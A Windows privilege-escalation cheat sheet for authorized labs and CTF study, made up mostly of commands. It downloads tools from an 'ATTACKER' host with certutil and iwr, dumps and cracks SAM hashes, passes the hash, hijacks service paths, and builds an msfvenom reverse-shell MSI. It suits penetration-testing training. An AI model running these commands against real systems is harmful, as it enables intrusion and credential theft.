# Windows Privilege Escalation Cheat Sheet

Command-focused Windows privilege escalation notes for authorized labs and CTF machines.

Sources used to build this local sheet:

- Hexdump Windows Privilege Escalation full course: https://www.youtube.com/watch?v=OmW7351U8cI
- LeonardoE95 teaching material: https://github.com/LeonardoE95/yt-en
- LeonardoE95 OSCP notes and cheatsheet: https://github.com/LeonardoE95/OSCP

Use this with the decision path in [Windows Attack Path Cheat Sheet](../guides/Windows%20Attack%20Path%20Cheat%20Sheet.md).

## Baseline Enumeration

Run this before choosing an escalation route:

```cmd
whoami
whoami /priv
whoami /groups
hostname
systeminfo
set
echo %PATH%
where powershell
ipconfig /all
route print
netstat -ano
net user
net accounts
net localgroup administrators
net localgroup "Remote Management Users"
wmic useraccount get domain,name,sid
cmdkey /list
```

PowerShell equivalents and extras:

```powershell
powershell -ep bypass
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
dir env:
Get-Process
Get-Service * | Select-Object DisplayName,Status,ServiceName,Can*
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like "Running"}
```

Installed software:

```cmd
wmic product get name,version
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
```

PowerShell installed app view:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select DisplayName,DisplayVersion
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select DisplayName,DisplayVersion
```

## File Transfer

Download from your controlled lab host:

```cmd
certutil -urlcache -split -f http://ATTACKER/winPEASx64.exe winPEASx64.exe
powershell -c "iwr -uri http://ATTACKER/PrivescCheck.ps1 -Outfile PrivescCheck.ps1"
```

Serve files from Kali:

```bash
python3 -m http.server 80
impacket-smbserver share . -smb2support
```

Mount an attacker SMB share from Windows:

```powershell
New-PSDrive -Name attacker -PSProvider FileSystem -Root \\ATTACKER\share
```

## Useful Tools

Use automated tooling to support manual decisions, not as the only source of truth:

- `winPEASx64.exe`: broad Windows local enumeration.
- `PrivescCheck.ps1`: PowerShell privilege escalation checks.
- `Seatbelt.exe`: host and user context collection.
- `SharpHound.exe`: AD relationship collection when domain scope allows it.
- `Mimikatz.exe`: credential material in controlled labs.
- `PrintSpoofer64.exe`, `GodPotato`, `JuicyPotatoNG`: token impersonation labs after OS/build checks.
- `chisel.exe`, `ligolo-ng`, `plink.exe`: tunneling and pivot support.
- `nc.exe`, `ncat.exe`: listeners and simple connectivity checks.

## Files With Sensitive Data

Common locations:

```powershell
Get-ChildItem -Path C:\Users\ -Include *.kdbx,*.txt,*.config,*.xml,*.ini,*.bak,*.zip -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include web.config,unattend.xml,sysprep.inf,ConsoleHost_history.txt -File -Recurse -ErrorAction SilentlyContinue
Select-String -Path C:\Users\*\* -Pattern "password","passwd","pwd","secret","token" -ErrorAction SilentlyContinue
```

PowerShell history:

```powershell
(Get-PSReadlineOption).HistorySavePath
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

KeePass:

```bash
keepass2john Database.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 13400 keepass.hash rockyou.txt
```

## Windows Hashes

If you have privileges that allow registry hive reads in a lab:

```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
```

Parse offline:

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
hashcat -m 1000 ntlm.hashes rockyou.txt
```

Hash mode reminders:

```bash
john --format=nt hash.txt --wordlist=rockyou.txt
hashcat -m 1000 hash.txt rockyou.txt
hashcat -m 5600 netntlmv2.hash rockyou.txt
```

Pass-the-hash after authorization:

```bash
evil-winrm -i target -u user -H NTHASH
impacket-psexec DOMAIN/user@target -hashes :NTHASH
impacket-wmiexec DOMAIN/user@target -hashes :NTHASH
```

## Stored Credentials And Windows Vault

```cmd
cmdkey /list
vaultcmd /list
vaultcmd /listcreds:"Web Credentials" /all
runas /savecred /user:DOMAIN\user "cmd.exe"
```

PowerShell credential XML:

```powershell
$cred = Import-CliXml -Path C:\path\cred.xml
$cred.GetNetworkCredential() | Format-List *
```

Look for browser, RDP, VPN, database client, deployment, and backup tool credentials.

## Windows Services

List services:

```cmd
sc query
sc qc ServiceName
sc sdshow ServiceName
wmic service get name,displayname,pathname,startmode
```

PowerShell:

```powershell
Get-Service
Get-CimInstance -ClassName win32_service | Select Name,State,StartMode,PathName
ConvertFrom-SddlString -Sddl "SDDL_STRING"
```

Check binary and config permissions:

```cmd
icacls "C:\Path\service.exe"
accesschk.exe -uwcqv "Authenticated Users" *
wmic process list full | findstr /i "executablepath=C:"
```

## Weak Service Permissions

If you can modify service config:

```cmd
sc qc ServiceName
sc config ServiceName binPath= "C:\Windows\Temp\payload.exe"
sc stop ServiceName
sc start ServiceName
```

If only the executable is writable, replace the binary with a lab payload and restore it after proof.

## Unquoted Service Path

Find candidates:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
```

This is exploitable only if the path is unquoted, contains spaces, runs with high privilege, and you can write to an earlier path component.

## DLL Hijacking

Use when a privileged process loads a DLL from a writable location or searches the current directory before a safe system path.

Checks:

```cmd
icacls "C:\Program Files\App"
where /r C:\ missing.dll
```

Workflow:

- Identify missing or unsafe DLL load with ProcMon or logs.
- Confirm write access to the load location.
- Compile an architecture-matched DLL.
- Trigger the service/app in the lab and capture proof.

## AlwaysInstallElevated

Both registry values must be `0x1`:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Lab payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o setup.msi
```

Run on target:

```cmd
msiexec /quiet /qn /i C:\Windows\Temp\setup.msi
```

## Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
dir C:\Windows\Tasks
dir C:\Windows\System32\Tasks
```

PowerShell task actions:

```powershell
Get-ScheduledTask
Get-ScheduledTask -TaskName "TaskName" | Format-List *
(Get-ScheduledTask -TaskName "TaskName").Actions
Export-ScheduledTask -TaskName "TaskName" -TaskPath "\"
```

Check task action paths and scripts for writable files or directories:

```cmd
icacls "C:\Path\script.bat"
icacls "C:\Path"
```

## Critical Registry Paths

Autoruns and startup:

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

Services:

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Services
reg query HKLM\SYSTEM\CurrentControlSet\Services\ServiceName
```

Service image path from PowerShell:

```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ServiceName"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ServiceName" -Name ImagePath -Value "C:\Windows\Temp\payload.exe"
```

AppInit DLLs:

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "LoadAppInit_DLLs"
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs"
```

Winlogon:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## SeImpersonatePrivilege

```cmd
whoami /priv
```

If `SeImpersonatePrivilege` is enabled, check OS version, installed patches, service context, and lab rules before choosing a Potato-family technique. Common lab tools include `PrintSpoofer`, `GodPotato`, and `JuicyPotatoNG`.

## UAC Bypass

Use this only when:

- the user is already a local administrator,
- UAC is blocking a high-integrity action,
- the bypass is allowed by the lab,
- the Windows build is compatible.

Check integrity and groups:

```cmd
whoami /groups
whoami /priv
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

PowerShell view:

```powershell
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" | Select EnableLUA,ConsentPromptBehaviorAdmin
```

## AMSI Notes

AMSI matters when PowerShell payloads or scripts are blocked. Prefer simple, transparent lab execution first: signed scripts, local compiled tools, or commands that do not require bypassing security controls. Treat bypass research as a separate controlled lab topic, not a default step.

## Cross Compilation

Compile Windows executables from Linux:

```bash
x86_64-w64-mingw32-gcc payload.c -o payload.exe
i686-w64-mingw32-gcc payload.c -o payload32.exe
```

Compile a DLL for DLL hijacking labs:

```bash
x86_64-w64-mingw32-gcc -shared -o hijack.dll hijack.c
```

Match target architecture and test locally before uploading.

## Study Checklist

Map a Windows privesc machine to these course topics:

- shell access and file transfer
- permissions and groups
- `SeImpersonatePrivilege`
- services, weak service permissions, unquoted paths, and DLL hijacking
- UAC and AlwaysInstallElevated
- sensitive files, hashes, stored credentials, and Windows Vault
- scheduled tasks and critical registry paths
- tooling, AMSI friction, and cross compilation
